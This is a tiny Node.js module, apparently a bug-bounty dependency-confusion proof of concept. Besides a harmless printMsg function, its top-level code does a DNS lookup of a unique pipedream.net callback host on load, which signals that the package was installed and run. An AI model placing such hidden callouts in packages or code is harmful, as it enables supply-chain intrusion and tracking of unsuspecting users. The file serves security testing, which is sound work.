exports.printMsg = function() {
  console.log("This is a test from tosun@wearehackerone.com");
}

const dns = require('dns');

dns.lookup('0006166aa72d9f58c6c28e76910a79cf.m.pipedream.net', (err, address, family) => {
  console.log('address: %j family: IPv%s', address, family);
});
